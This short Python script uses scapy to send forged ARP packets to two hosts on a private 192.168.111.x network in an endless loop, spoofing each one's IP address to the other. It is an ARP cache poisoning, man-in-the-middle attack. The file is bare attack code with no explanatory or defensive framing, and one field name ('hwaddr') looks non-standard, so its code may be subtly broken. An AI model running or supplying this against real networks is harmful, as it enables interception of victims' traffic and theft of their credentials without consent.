import scapy.all as scapy

while True:
    packet = scapy.ARP(op=1, pdst="192.168.111.157", hwaddr="00:0c:29:1e:76:af", psrc="192.168.111.2")
    scapy.send(packet) 

    packet = scapy.ARP(op=1, pdst="192.168.111.2", hwaddr="00:50:56:e7:86:57", psrc="192.168.111.157")
    scapy.send(packet) 